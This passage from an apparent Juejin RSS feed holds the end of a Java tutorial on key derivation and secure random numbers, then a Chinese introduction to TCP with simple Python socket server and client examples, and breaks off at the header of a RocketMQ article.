        SecureRandom <span class="hljs-attr">random</span> = new SecureRandom()<span class="hljs-comment">;</span>
        random.nextBytes(masterKey)<span class="hljs-comment">;</span>
        
        System.out.println("=== HKDF密钥派生 ===")<span class="hljs-comment">;</span>
        byte<span class="hljs-section">[]</span> <span class="hljs-attr">salt</span> = new byte[<span class="hljs-number">32</span>]<span class="hljs-comment">;</span>
        random.nextBytes(salt)<span class="hljs-comment">;</span>
        byte<span class="hljs-section">[]</span> <span class="hljs-attr">info</span> = <span class="hljs-string">"application-key"</span>.getBytes()<span class="hljs-comment">;</span>
        
        byte<span class="hljs-section">[]</span> <span class="hljs-attr">derivedKey</span> = derive(masterKey, salt, info, <span class="hljs-number">32</span>)<span class="hljs-comment">;</span>
        System.out.println("主密钥长度: " + masterKey.length + " 字节")<span class="hljs-comment">;</span>
        System.out.println("派生密钥长度: " + derivedKey.length + " 字节")<span class="hljs-comment">;</span>
        
        System.out.println("\<span class="hljs-attr">n</span>=== 派生多个密钥 ===<span class="hljs-string">");
        byte[][] keys = deriveMultipleKeys(masterKey, 3, 32);
        System.out.println("</span>派生了 <span class="hljs-string">" + keys.length + "</span> 个密钥<span class="hljs-string">");
        for (int i = 0; i &lt; keys.length; i++) {
            System.out.println("</span>密钥 <span class="hljs-string">" + i + "</span> 长度: <span class="hljs-string">" + keys[i].length + "</span> 字节<span class="hljs-string">");
        }
    }
}
</span></code></pre>
<hr/>
<h2 data-id="heading-36">密码学随机数生成器</h2>
<h3 data-id="heading-37">原理</h3>
<p>密码学安全的随机数生成器（CSPRNG）生成不可预测的随机数，用于密钥、IV、nonce等。</p>
<h3 data-id="heading-38">Java SecureRandom</h3>
<p>Java的<code>SecureRandom</code>提供密码学安全的随机数生成。</p>
<h3 data-id="heading-39">Java实现示例</h3>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> java.security.SecureRandom;
<span class="hljs-keyword">import</span> java.util.Base64;
​
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureRandomExample</span> {
    
    <span class="hljs-comment">/**
     * 生成随机字节
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">byte</span>[] <span class="hljs-built_in">generateRandomBytes</span>(<span class="hljs-type">int</span> length) {
        SecureRandom random = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SecureRandom</span>();
        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[length];
        random.<span class="hljs-built_in">nextBytes</span>(bytes);
        <span class="hljs-keyword">return</span> bytes;
    }
    
    <span class="hljs-comment">/**
     * 生成随机密钥
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> <span class="hljs-title">generateRandomKey</span><span class="hljs-params">(<span class="hljs-type">int</span> keyLengthBits)</span> </span>{
        <span class="hljs-type">byte</span>[] key = <span class="hljs-built_in">generateRandomBytes</span>(keyLengthBits / <span class="hljs-number">8</span>);
        <span class="hljs-keyword">return</span> Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(key);
    }
    
    <span class="hljs-comment">/**
     * 生成随机Salt
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">String</span> <span class="hljs-title">generateSalt</span><span class="hljs-params">(<span class="hljs-type">int</span> saltLengthBytes)</span> </span>{
        <span class="hljs-keyword">return</span> Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(<span class="hljs-built_in">generateRandomBytes</span>(saltLengthBytes));
    }
    
    <span class="hljs-comment">/**
     * 生成随机IV
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">byte</span>[] <span class="hljs-built_in">generateIV</span>(<span class="hljs-type">int</span> ivLengthBytes) {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">generateRandomBytes</span>(ivLengthBytes);
    }
    
    <span class="hljs-comment">/**
     * 生成随机Nonce
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">byte</span>[] <span class="hljs-built_in">generateNonce</span>(<span class="hljs-type">int</span> nonceLengthBytes) {
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">generateRandomBytes</span>(nonceLengthBytes);
    }
    
    <span class="hljs-comment">/**
     * 生成随机整数（在范围内）
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title">generateRandomInt</span><span class="hljs-params">(<span class="hljs-type">int</span> min, <span class="hljs-type">int</span> max)</span> </span>{
        SecureRandom random = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SecureRandom</span>();
        <span class="hljs-keyword">return</span> random.<span class="hljs-built_in">nextInt</span>(max - min + <span class="hljs-number">1</span>) + min;
    }
    
    <span class="hljs-comment">/**
     * 使用特定算法
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> SecureRandom <span class="hljs-title">createSecureRandom</span><span class="hljs-params">(<span class="hljs-type">String</span> algorithm)</span> throws Exception </span>{
        <span class="hljs-keyword">return</span> SecureRandom.<span class="hljs-built_in">getInstance</span>(algorithm);
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws Exception </span>{
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"=== 密码学随机数生成 ==="</span>);
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n随机密钥:"</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"256位密钥: "</span> + <span class="hljs-built_in">generateRandomKey</span>(<span class="hljs-number">256</span>));
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n随机Salt:"</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"128位Salt: "</span> + <span class="hljs-built_in">generateSalt</span>(<span class="hljs-number">16</span>));
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n随机IV:"</span>);
        <span class="hljs-type">byte</span>[] iv = <span class="hljs-built_in">generateIV</span>(<span class="hljs-number">16</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"IV: "</span> + Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(iv));
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n随机Nonce:"</span>);
        <span class="hljs-type">byte</span>[] nonce = <span class="hljs-built_in">generateNonce</span>(<span class="hljs-number">12</span>);
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"Nonce: "</span> + Base64.<span class="hljs-built_in">getEncoder</span>().<span class="hljs-built_in">encodeToString</span>(nonce));
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n随机整数 (1-100):"</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
            System.out.<span class="hljs-built_in">println</span>(<span class="hljs-built_in">generateRandomInt</span>(<span class="hljs-number">1</span>, <span class="hljs-number">100</span>));
        }
        
        System.out.<span class="hljs-built_in">println</span>(<span class="hljs-string">"\n可用的SecureRandom算法:"</span>);
        <span class="hljs-type">String</span>[] algorithms = {<span class="hljs-string">"NativePRNG"</span>, <span class="hljs-string">"SHA1PRNG"</span>, <span class="hljs-string">"Windows-PRNG"</span>};
        <span class="hljs-keyword">for</span> (<span class="hljs-type">String</span> alg : algorithms) {
            <span class="hljs-keyword">try</span> {
                SecureRandom sr = <span class="hljs-built_in">createSecureRandom</span>(alg);
                System.out.<span class="hljs-built_in">println</span>(alg + <span class="hljs-string">": ✓"</span>);
            } <span class="hljs-built_in">catch</span> (Exception e) {
                System.out.<span class="hljs-built_in">println</span>(alg + <span class="hljs-string">": ✗"</span>);
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-40">安全建议</h3>
<p>✅ <strong>推荐：</strong></p>
<ul>
<li>使用<code>SecureRandom</code>而非<code>Random</code></li>
<li>生成足够长度的随机值（密钥至少128位）</li>
<li>IV和Nonce必须唯一（不重复使用）</li>
</ul>
<p>⚠️ <strong>避免：</strong></p>
<ul>
<li>使用<code>java.util.Random</code>（不安全）</li>
<li>重复使用IV/Nonce</li>
<li>可预测的随机数</li>
</ul>
<hr/>
<h2 data-id="heading-41">密码哈希算法对比</h2>













































<table><thead><tr><th>算法</th><th>抗暴力破解</th><th>抗GPU攻击</th><th>抗侧信道</th><th>内存需求</th><th>推荐度</th></tr></thead><tbody><tr><td>Argon2id</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td><td>高</td><td>⭐⭐⭐⭐⭐</td></tr><tr><td>scrypt</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐⭐⭐</td><td>⭐⭐⭐</td><td>高</td><td>⭐⭐⭐⭐</td></tr><tr><td>bcrypt</td><td>⭐⭐⭐⭐</td><td>⭐⭐⭐</td><td>⭐⭐⭐</td><td>低</td><td>⭐⭐⭐⭐</td></tr><tr><td>PBKDF2</td><td>⭐⭐⭐</td><td>⭐⭐</td><td>⭐⭐⭐</td><td>低</td><td>⭐⭐⭐</td></tr></tbody></table>
<h3 data-id="heading-42">选择建议</h3>
<p><strong>新项目：</strong> Argon2id <strong>现有项目：</strong> bcrypt或PBKDF2（逐步迁移） <strong>高安全需求：</strong> Argon2id或scrypt <strong>资源受限：</strong> PBKDF2</p>
<hr/>
<h2 data-id="heading-43">总结</h2>
<h3 data-id="heading-44">密钥派生选择</h3>
<p><strong>密码哈希：</strong></p>
<ul>
<li><strong>首选</strong>：Argon2id</li>
<li><strong>备选</strong>：bcrypt</li>
</ul>
<p><strong>密钥派生：</strong></p>
<ul>
<li><strong>首选</strong>：HKDF</li>
<li><strong>备选</strong>：PBKDF2</li>
</ul>
<h3 data-id="heading-45">随机数生成</h3>
<p><strong>必须使用</strong>：<code>SecureRandom</code></p>
<h3 data-id="heading-46">选择决策树</h3>
<pre><code class="hljs">需要密钥派生？
├─ 密码哈希？→ Argon2id
├─ 从主密钥派生？→ HKDF
└─ 兼容性要求？→ PBKDF2
​
需要随机数？
└─ 使用SecureRandom
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[TCP协议概要与Python示例]]></title>    <link>https://juejin.cn/post/7579567346391023642</link>    <guid>https://juejin.cn/post/7579567346391023642</guid>    <pubDate>2025-12-04T04:18:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579567346391023642" data-draft-id="7579567346390990874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="TCP协议概要与Python示例"/> <meta itemprop="keywords" content="TCP/IP"/> <meta itemprop="datePublished" content="2025-12-04T04:18:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开心_开心急了"/> <meta itemprop="url" content="https://juejin.cn/user/2975724155181111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            TCP协议概要与Python示例
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2975724155181111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开心_开心急了
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T04:18:49.000Z" title="Thu Dec 04 2025 04:18:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">传输控制协议</h2>
<p><strong>传输控制协议</strong>（TCP，Transmission Control Protocol）是一种面向连接的、可靠的、基于字节流的传输层通信协议。</p>
<h3 data-id="heading-1">关键特性</h3>
<ol>
<li>可靠性：</li>
</ol>
<ul>
<li>
<p>通过确认机制和重传机制，确保数据不丢失、不重复。</p>
</li>
<li>
<p>通过校验和检查数据完整性。</p>
</li>
</ul>
<ol start="2">
<li>面向连接：</li>
</ol>
<ul>
<li>在数据传输前需要建立连接，传输结束后需要关闭连接。</li>
</ul>
<ol start="3">
<li>有序性：</li>
</ol>
<ul>
<li>数据按发送顺序到达接收方。</li>
</ul>
<ol start="4">
<li>流量控制：</li>
</ol>
<ul>
<li>
<p>通过滑动窗口机制，动态调整发送速率。</p>
</li>
</ul>
<ol start="5">
<li>拥塞控制：</li>
</ol>
<ul>
<li>
<p>通过慢启动、拥塞避免等算法，避免网络拥塞。</p>
</li>
</ul>
<h3 data-id="heading-2">TCP工作原理</h3>
<p><code>TCP</code>通过<strong>三次握手</strong>建立连接，通过<strong>四次挥手</strong>终止连接，并在数据传输过程中使用确认机制、重传机制和流量控制来保证可靠性。</p>
<h4 data-id="heading-3">1.三次握手建立连接</h4>
<p><img src="https://www.runoob.com/wp-content/uploads/2025/02/tcp-1.png" alt="TCP三次握手示例" loading="lazy"/></p>
<ul>
<li>
<p>SYN：客户端发送一个SYN包(同步请求)给服务器,表示请求建立连接。</p>
</li>
<li>
<p>SYN-ACK：服务器收到SYN包后，回复一个SYN-ACK(同步确认),表示同意建立连接。</p>
</li>
<li>
<p>ACK：客户端收到SYN-ACK包后，发送一个ACK包(确认)，表示连接已建立。</p>
</li>
</ul>
<h4 data-id="heading-4">2.数据传输</h4>
<p>在连接建立后，TCP 通过以下机制确保数据的可靠传输：</p>
<ul>
<li>
<p><strong>序列号和确认号</strong>：每个数据包都有一个序列号，接收方通过确认号告知发送方哪些数据已成功接收。</p>
</li>
<li>
<p><strong>重传机制</strong>：如果发送方未收到确认，会重新发送数据包。</p>
</li>
<li>
<p><strong>流量控制</strong>：通过滑动窗口机制，动态调整发送速率，避免接收方缓冲区溢出。</p>
</li>
<li>
<p><strong>拥塞控制</strong>：通过慢启动、拥塞避免等算法，动态调整发送速率，避免网络拥塞。</p>
</li>
</ul>
<h4 data-id="heading-5">3.四次挥手终止连接</h4>
<p><img src="https://www.runoob.com/wp-content/uploads/2025/02/tcp-2.png" alt="TCP四次挥手示例" loading="lazy"/></p>
<ul>
<li>
<p><strong>FIN</strong>：客户发送一个<code>FIN</code>包，表示请求关闭连接。</p>
</li>
<li>
<p><strong>ACK</strong>：服务器收到<code>FIN</code>包后，回复一个<code>ACK</code>包，表示确认。</p>
</li>
<li>
<p><strong>FIN</strong>：服务器发送一个 <code>FIN</code> 包，表示服务器也准备关闭连接。</p>
</li>
<li>
<p><strong>ACK</strong>：客户端收到 <code>FIN</code> 包后，回复一个 <code>ACK</code> 包，表示确认。连接正式关闭。</p>
</li>
</ul>
<h3 data-id="heading-6">总结</h3>
<p>从<strong>三次握手</strong>和<strong>四次挥手</strong>不难看出，每次都是<strong>客户端</strong>先发起请求(<code>SYN</code>或<code>FIN</code>),而<strong>服务端</strong>同步确认(<code>SYN-ACK</code>)是一起发送的，而结束<code>FIN</code>需要先确认(<code>ACK</code>)<strong>服务端</strong>的请求，再发送结束请求(<code>FIN</code>)等待<strong>客户端</strong>确认后才会关闭连接。</p>
<h3 data-id="heading-7">参考</h3>
<p>文档内容参考自如下：</p>
<ol>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fbaike.baidu.com%2Fitem%2FTCP%2F33012" target="_blank" title="https://baike.baidu.com/item/TCP/33012" ref="nofollow noopener noreferrer">百度百科TCP定义</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.runoob.com%2Fnp%2Ftcp-protocol.html" target="_blank" title="https://www.runoob.com/np/tcp-protocol.html" ref="nofollow noopener noreferrer">菜鸟教程TCP协议</a></p>
</li>
</ol>
<h3 data-id="heading-8">Python简单示例</h3>
<p><strong>注意</strong>：如果是需要在不同设备之间连接，将<code>IP</code>改为<code>局域网IP</code>或者<code>公网IP</code>。</p>
<h4 data-id="heading-9">服务端</h4>
<pre><code class="hljs language-py" lang="py"><span class="hljs-comment"># server.py</span>
<span class="hljs-keyword">import</span> socket

<span class="hljs-comment"># 1. 创建 TCP Socket（AF_INET = IPv4, SOCK_STREAM = TCP）</span>
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-comment"># 2. 绑定 IP 和端口（监听本地 127.0.0.1:8080）</span>
server_socket.bind((<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">8080</span>))

<span class="hljs-comment"># 3. 开始监听，最多允许 5 个客户端排队</span>
server_socket.listen(<span class="hljs-number">5</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"服务器启动，等待客户端连接..."</span>)

<span class="hljs-comment"># 4. 接受客户端连接（阻塞直到有连接）</span>
client_socket, addr = server_socket.accept()
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"客户端 <span class="hljs-subst">{addr}</span> 已连接"</span>)

<span class="hljs-keyword">try</span>:

<span class="hljs-comment"># 5. 接收数据（最多 1024 字节）</span>
data = client_socket.recv(<span class="hljs-number">1024</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"收到消息: <span class="hljs-subst">{data.decode(<span class="hljs-string">'utf-8'</span>)}</span>"</span>)

<span class="hljs-comment"># 6. 发送回复</span>
reply = <span class="hljs-string">"Hello from server!"</span>
client_socket.send(reply.encode(<span class="hljs-string">'utf-8'</span>))

<span class="hljs-keyword">finally</span>:

<span class="hljs-comment"># 7. 关闭连接（触发四次挥手）</span>
client_socket.close()
server_socket.close()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"连接已关闭"</span>)

</code></pre>
<h4 data-id="heading-10">客户端</h4>
<pre><code class="hljs language-py" lang="py"><span class="hljs-comment"># client.py</span>
<span class="hljs-keyword">import</span> socket

<span class="hljs-comment"># 1. 创建 TCP Socket</span>
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

<span class="hljs-comment"># 2. 连接到服务器（触发三次握手）</span>
client_socket.connect((<span class="hljs-string">'127.0.0.1'</span>, <span class="hljs-number">8080</span>))
<span class="hljs-built_in">print</span>(<span class="hljs-string">"已连接到服务器"</span>)

<span class="hljs-keyword">try</span>:
<span class="hljs-comment"># 3. 发送消息</span>
msg = <span class="hljs-string">"Hello from client!"</span>
client_socket.send(msg.encode(<span class="hljs-string">'utf-8'</span>))

<span class="hljs-comment"># 4. 接收服务器回复</span>
response = client_socket.recv(<span class="hljs-number">1024</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"服务器回复: <span class="hljs-subst">{response.decode(<span class="hljs-string">'utf-8'</span>)}</span>"</span>)

<span class="hljs-keyword">finally</span>:
<span class="hljs-comment"># 5. 关闭连接</span>
client_socket.close()
<span class="hljs-built_in">print</span>(<span class="hljs-string">"客户端连接已关闭"</span>)
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[谁懂啊！测试环境 RocketMQ 延迟消息崩了，罪魁祸首是个…]]></title>    <link>https://juejin.cn/post/7579556047783231540</link>    <guid>https://juejin.cn/post/7579556047783231540</guid>    <pubDate>2025-12-04T03:51:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579556047783231540" data-draft-id="7579573664229081097" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="谁懂啊！测试环境 RocketMQ 延迟消息崩了，罪魁祸首是个…"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2025-12-04T03:51:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="爱找乐子的李寻欢"/> <meta itemprop="url" content="https://juejin.cn/user/3228615868953102"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            谁懂啊！测试环境 RocketMQ 延迟消息崩了，罪魁祸首是个…
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3228615868953102/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    爱找乐子的李寻欢
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T03:51:42.000Z" title="Thu Dec 04 2025 03:51:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    26
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em 